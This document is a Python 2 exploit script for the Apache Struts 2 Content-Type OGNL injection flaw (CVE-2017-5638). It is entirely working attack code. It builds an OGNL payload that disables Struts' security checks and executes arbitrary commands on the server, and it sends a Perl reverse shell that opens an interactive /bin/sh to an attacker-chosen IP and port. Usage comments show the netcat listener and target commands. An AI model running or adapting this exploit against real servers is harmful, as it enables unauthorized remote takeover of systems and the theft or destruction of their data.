# Apache Struts 2 Vulnerability Remote Code Execution
# Reverse shell from target
# Author: anarc0der - github.com/anarcoder
# Tested with tomcat8

# Install tomcat8
# Deploy WAR file https://github.com/nixawk/labs/tree/master/CVE-2017-5638

# Ex:
# Open: $ nc -lnvp 4444
# python2 struntsrce.py --target=http://localhost:8080/struts2_2.3.15.1-showcase/showcase.action --ip=127.0.0.1 --port=4444
# python2 struntsrce.py --target=http://localhost:8080/struts2_2.3.15.1-showcase/showcase.action --test
# python2 struntsrce.py --target=http://localhost:8080/struts2_2.3.15.1-showcase/showcase.action --cmd=&#039;uname -a&#039;


"""
Usage:
    struntsrce.py --target=<arg> --test
    struntsrce.py --target=<arg> --cmd=<arg>
    struntsrce.py --target=<arg> --ip=<arg> --port=<arg>
    struntsrce.py --help
    struntsrce.py --version
Options:
    -h --help                                Open help menu
    -v --version                             Show version
Required options:
    --target=&#039;url target&#039;                    your target :)
    --test                                   check if target is vulnerable or not
    --cmd=&#039;uname -a&#039;                         your command to execute in target
    --ip=&#039;10.10.10.1&#039;                        your ip
    --port=4444                              open port for back connection
"""

import urllib2
import httplib
import os
import sys
from docopt import docopt, DocoptExit


class CVE_2017_5638():

    def __init__(self, p_target):
        self.target = p_target
    #    self.ip = p_ip
    #    self.port = p_port
    #    self.exploit()

    def generate_revshell(self, p_ip, p_port):
        revshell = "perl -e \\&#039;use Socket;$i=\"{0}\";$p={1};"\
                   "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"\
                   "if(connect(S,sockaddr_in($p,inet_aton($i)))){{open"\
                   "(STDIN,\">&S\");open(STDOUT,\">&S\");"\
                   "open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};\\&#039;"
        return revshell.format(p_ip, p_port)

    def generate_payload(self, p_cmd):
        payload = "%{{(#_=&#039;multipart/form-data&#039;)."\
                  "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."\
                  "(#_memberAccess?"\
                  "(#_memberAccess=#dm):"\
                  "((#container=#context[&#039;com.opensymphony.xwork2."\
                  "ActionContext.container&#039;])."\
                  "(#ognlUtil=#container.getInstance(@com.opensymphony."\
                  "xwork2.ognl.OgnlUtil@class))."\
                  "(#ognlUtil.getExcludedPackageNames().clear())."\
                  "(#ognlUtil.getExcludedClasses().clear())."\
                  "(#context.setMemberAccess(#dm))))."\
                  "(#cmd=&#039;{0}&#039;)."\
                  "(#iswin=(@java.lang.System@getProperty(&#039;os.name&#039;)."\
                  "toLowerCase().contains(&#039;win&#039;)))."\
                  "(#cmds=(#iswin?{{&#039;cmd.exe&#039;,&#039;/c&#039;,#cmd}}:"\
                  "{{&#039;/bin/bash&#039;,&#039;-c&#039;,#cmd}}))."\
                  "(#p=new java.lang.ProcessBuilder(#cmds))."\
                  "(#p.redirectErrorStream(true)).(#process=#p.start())."\
                  "(#ros=(@org.apache.struts2.ServletActionContext@get"\
                  "Response().getOutputStream()))."\
                  "(@org.apache.commons.io.IOUtils@copy"\
                  "(#process.getInputStream(),#ros)).(#ros.flush())}}"
        return payload.format(p_cmd)

    def send_xpl(self, p_payload):
        body = &#039;&#039;
        try:
            # Set proxy for debug request, just uncomment these lines
            # Change the proxy port

            #proxy = urllib2.ProxyHandler({&#039;http&#039;: &#039;127.0.0.1:8081&#039;})
            #opener = urllib2.build_opener(proxy)
            #urllib2.install_opener(opener)

            headers = {&#039;User-Agent&#039;: &#039;Mozilla/5.0 (X11; Linux x86_64)&#039;
                                     &#039; AppleWebKit/537.36 (KHTML, like Gecko)&#039;
                                     &#039; Chrome/55.0.2883.87 Safari/537.36&#039;,
                       &#039;Content-Type&#039;: p_payload}
            xpl = urllib2.Request(self.target, headers=headers)
            body = urllib2.urlopen(xpl, timeout=5).read()
        except httplib.IncompleteRead as b:
            body = b.partial
        except:
            pass
        return body

    def os_detect(self):
        cmd = &#039;uname&#039;
        resp = self.send_xpl(self.generate_payload(cmd))
        if &#039;Linux&#039; in resp or &#039;Darwin&#039; in resp:
            print &#039;[+] Unix-like OS system detected.\n&#039;
        else:
            print &#039;[+] Windows OS system detected.\n&#039;

    def test_vuln(self):
        cmd = &#039;hacked&#039;
        print &#039;\n[+] Testing &#039; + self.target
        resp = self.send_xpl(self.generate_payload(cmd))
        tags = [&#039;<html&#039;, &#039;<head&#039;, &#039;<body&#039;, &#039;<script&#039;, &#039;<div&#039;]
        if any(tag not in resp.lower() for tag in tags) and cmd in resp:
            print &#039;[+] Target possibly vulnerable&#039;
            print &#039;[+] Finger printing OS system..&#039;
            self.os_detect()
        else:
            print &#039;[-] Target not vulnerable\n&#039;
            sys.exit(0)

    def exec_cmd(self, p_cmd):
        print &#039;\n[+] Target: {0}&#039;.format(self.target)
        print &#039;[+] Executing: {0}\n\n&#039;.format(p_cmd)
        resp = self.send_xpl(self.generate_payload(p_cmd))
        print resp

    def exec_revshell(self, p_ip, p_port):
        print &#039;\n[+] Target: {0}&#039;.format(self.target)
        print &#039;[+] Dont forget to listen on port: {0}&#039;.format(p_port)
        print &#039;[+] Attempting reverse shell...\n&#039;

        self.send_xpl(self.generate_payload(
            self.generate_revshell(p_ip, p_port)))


def main():
    try:
        arguments = docopt(__doc__, version="Apache Strunts RCE Exploit")
        target = arguments[&#039;--target&#039;]
        test = arguments[&#039;--test&#039;]
        cmd = arguments[&#039;--cmd&#039;]
        ip = arguments[&#039;--ip&#039;]
        port = arguments[&#039;--port&#039;]

    except DocoptExit as e:
        os.system(&#039;python2 struntsrce.py --help&#039;)
        sys.exit(1)

    x = CVE_2017_5638(target)
    if test:
        x.test_vuln()
    if cmd:
        x.exec_cmd(cmd)
    if ip and port:
        x.exec_revshell(ip, port)


if __name__ == &#039;__main__&#039;:
main()

